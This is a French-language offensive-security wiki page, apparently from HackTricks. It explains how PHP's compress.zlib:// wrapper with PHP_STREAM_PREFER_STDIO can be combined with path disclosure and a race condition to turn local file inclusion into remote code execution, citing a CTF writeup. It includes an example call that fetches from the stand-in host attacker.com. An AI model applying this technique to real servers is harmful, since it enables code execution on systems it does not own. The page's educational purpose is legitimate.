# LFI2RCE Via compress.zlib + PHP_STREAM_PREFER_STUDIO + Path Disclosure

{{#include ../../banners/hacktricks-training.md}}

### `compress.zlib://` et `PHP_STREAM_PREFER_STDIO`

Un fichier ouvert en utilisant le protocole `compress.zlib://` avec le drapeau `PHP_STREAM_PREFER_STDIO` peut continuer à écrire des données qui arrivent à la connexion plus tard dans le même fichier.

Cela signifie qu'un appel tel que :
```php
file_get_contents("compress.zlib://http://attacker.com/file")
```
Enverra une requête demandant http://attacker.com/file, puis le serveur peut répondre à la requête avec une réponse HTTP valide, garder la connexion ouverte et envoyer des données supplémentaires quelque temps plus tard qui seront également écrites dans le fichier.

Vous pouvez voir cette information dans cette partie du code php-src dans main/streams/cast.c :
```c
/* Use a tmpfile and copy the old streams contents into it */

if (flags & PHP_STREAM_PREFER_STDIO) {
*newstream = php_stream_fopen_tmpfile();
} else {
*newstream = php_stream_temp_new();
}
```
### Condition de course vers RCE

[**Ce CTF**](https://balsn.tw/ctf_writeup/20191228-hxp36c3ctf/#includer) a été résolu en utilisant le truc précédent.

L'attaquant fera en sorte que le **serveur victime ouvre une connexion en lisant un fichier depuis le serveur de l'attaquant** en utilisant le protocole **`compress.zlib`**.

**Tant que** cette **connexion** existe, l'attaquant **exfiltrera le chemin** vers le fichier temporaire créé (il est divulgué par le serveur).

**Tant que** la **connexion** est encore ouverte, l'attaquant **exploite un LFI en chargeant le fichier temporaire** qu'il contrôle.

Cependant, il y a une vérification dans le serveur web qui **empêche le chargement de fichiers contenant `<?`**. Par conséquent, l'attaquant abussera d'une **Condition de course**. Dans la connexion qui est encore ouverte, l'**attaquant** **enverra la charge utile PHP APRÈS** que le **serveur web** a **vérifié** si le fichier contient les caractères interdits mais **AVANT qu'il ne charge son contenu**.

Pour plus d'informations, consultez la description de la Condition de course et le CTF dans [https://balsn.tw/ctf_writeup/20191228-hxp36c3ctf/#includer](https://balsn.tw/ctf_writeup/20191228-hxp36c3ctf/#includer)

{{#include ../../banners/hacktricks-training.md}}
